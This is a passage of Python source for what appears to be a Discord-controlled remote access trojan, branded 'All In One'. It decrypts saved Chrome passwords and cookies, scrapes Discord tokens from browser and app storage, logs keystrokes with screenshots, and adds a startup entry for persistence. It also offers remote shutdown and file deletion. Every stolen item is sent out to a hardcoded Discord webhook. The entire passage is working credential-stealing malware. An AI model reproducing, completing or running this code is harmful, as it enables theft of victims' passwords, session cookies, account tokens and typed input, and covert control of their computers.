    cursor = c.cursor()
    select_statement = 'SELECT action_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    extractedData = []
    for userdatacombo in login_data:
        if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "":
            password = decryptPassword(userdatacombo[2], getSecretKey())
            data = "URL : " + userdatacombo[0] + " Email/Username : " + userdatacombo[1] + " Password : " + str(password)
            extractedData.append(data)
        else:
            pass
    return extractedData
  def savePasswords(data):
        for line in data:
            res = os.path.dirname(os.path.abspath(__file__))
            username = os.getlogin()

            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            content = ""


            webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="Chrome Password", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
            embed = DiscordEmbed(title=f"**All In One**",  color=242424)
            test = socket.gethostname()

            web2 = f" \n" + f"{line}"
            embed.set_description(f"{web2}")
            embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
            embed.set_footer(text=f"All In One - Discord Tools Program")
            embed.set_timestamp()
            webhook.add_embed(embed)
            try:
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save(f'{fpaa}')
                with open(f"{fpaa}", "rb") as f:
                    webhook.add_file(file=f.read(), filename='0.jpg')
                    embed.set_image(url='attachment://0.jpg')
                    os.remove(fpaa)
            except:
                pass
            response = webhook.execute()
  def main():
    closeChrome()
    data = getChromePasswords()
    savePasswords(data)

  clear()
  main()

  res = os.path.dirname(os.path.abspath(__file__))

  web1 = "https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5"
  lc = os.getenv("LOCALAPPDATA")
  rm = os.getenv("APPDATA")
  PATHS = {
    "Discord": rm + "\\Discord",
    "Discord Canary": rm + "\\discordcanary",
    "Discord PTB": rm + "\\discordptb",
    "Google Chrome": lc + "\\Google\\Chrome\\User Data\\Default",
    "Opera": rm + "\\Opera Software\\Opera Stable"
  }
  def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
  def da(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
  def tukan(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
  def grabber():
    em = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)
    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }
    try:
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
    except:
        pass
  if __name__ == '__main__':
    grabber()

  clear()

keys = []
count = 0

@client.tree.command(name="keylogger")
async def keylogs(ctx): 
  import os
  import socket
  from pynput.keyboard import Key, Listener
  try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
  except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
  try:
    import pyautogui
  except:
    os.system('pip install pyautogui')
    import pyautogui
  content = ""
  username = os.getlogin()
  test = socket.gethostname()
  n = os.linesep

  fpaa = rf"C:\Users\{username}\Downloads\0.jpg"

  content = ""
  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="KeyLogger", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)
  webhook.add_embed(embed)

  embed.set_description(f"keylogs was start {n}PC = '{test}'{n}OS = '{username}'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()

  count = 0
  keys = []
  def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    
    if count >= 10:
    
        for key in keys:
            k = str(keys).replace("'", " ")
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
        count = 0
        embed.set_description(f"*{test}*{n}{n}{k}")
        embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
        embed.set_footer(text=f"All In One - Discord Tools Program")
        embed.set_timestamp()
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f'{fpaa}')
        with open(f"{fpaa}", "rb") as f:
            webhook.add_file(file=f.read(), filename='0.jpg')
            embed.set_image(url='attachment://0.jpg')
        os.remove(fpaa)
        response = webhook.execute()
        keys = []

  def on_release(key):
    pass

  with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()

@client.tree.command(name="restart")
async def Rest(ctx):
  os.system("shutdown /r /t 1")

@client.tree.command(name="off")
async def Off(ctx):
  os.system("shutdown /s /t 1")


@client.tree.command(name="startfile")
async def startf(ctx):
  res = os.path.dirname(os.path.abspath(__file__))
  username = os.getlogin()
  file_path = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startRAT.bat"
  if os.path.exists(file_path):
    pass
  else:
    with open(file_path, 'x') as fp:
      fp.write(rf"start /min cmd /c {res}\testA.pyw")
  test = socket.gethostname()
  n = os.linesep
  content = ""

  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (create_startfile)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)

  webhook.add_embed(embed)
  embed.set_description(f"text/code/other was create {n}PC = '{test}' {n}path = '{file_path}{n}{res}' {n}OS = '{username}'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()

@client.tree.command(name="deletemess")
@app_commands.describe(delnom = "delnom")
async def DEL(ctx, delnom: int):
  await ctx.channel.purge(limit=delnom)

@client.tree.command(name="delete")
@app_commands.describe(file_path = "file_path")
async def DELet(ctx, file_path: str):
  os.remove(f'{file_path}')
  username = os.getlogin()
  test = socket.gethostname()
  n = os.linesep
  content = ""

  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (create_startfile)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)

  webhook.add_embed(embed)
  embed.set_description(f"text/code/other was delete {n}PC = '{test}' {n}path = '{file_path}' {n}OS = '{username}'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()

@client.tree.command(name="cookie")
async def COOKIE(ctx):
  import os
  import json
  import base64
  import sqlite3
  import shutil
  import socket
  try:
    import pyautogui
  except:
    os.system("pip install pyautogui")
  import time
  try:
    import discord
    from discord.ext import commands
    from discord import Permissions
  except:
    os.system("pip install discord.py")
    import discord
    from discord.ext import commands
    from discord import Permissions
  try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
  except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
  from datetime import datetime, timedelta
  try:
    import win32crypt
  except:
    os.system("pip install win32")
    import win32crypt
  try:
    from Cryptodome.Cipher import AES
  except:
    os.system("pip install cryptodome")
    from Cryptodome.Cipher import AES
  test = socket.gethostname()
  username = os.getlogin()
  i = 0.1

  fpaa = rf"C:\Users\{username}\Downloads\0.jpg"

  def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

  def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

  def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

  def main():
    global i
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value
        aze = f"""
        Host : {host_key}

        Cookie name : {name}

        Cookie value (decrypted) : {decrypted_value}

        Creation datetime (UTC) : {get_chrome_datetime(creation_utc)}

        Last access datetime (UTC) : {get_chrome_datetime(last_access_utc)}

        Expires datetime (UTC) : {get_chrome_datetime(expires_utc)}

        ====================================="""
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
        content = ""
        
        webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (cookie)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
        
        embed = DiscordEmbed(title=f"**All In One**",  color=242424)
        webhook.add_embed(embed)
        embed.set_description(f"{aze}")
        embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
        embed.set_footer(text=f"All In One - Discord Tools Program")
        embed.set_timestamp()
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f'{fpaa}')
        with open(f"{fpaa}", "rb") as f:
            webhook.add_file(file=f.read(), filename='0.jpg')
            embed.set_image(url='attachment://0.jpg')
            i = i + 0.010001
        time.sleep(i)
        response = webhook.execute()
        os.remove(fpaa)
    db.commit()
    db.close()

  if __name__ == "__main__":
    main()
    directory = os.getcwd()

    os.remove(rf"{directory}\Cookies.db")


client.run(token)
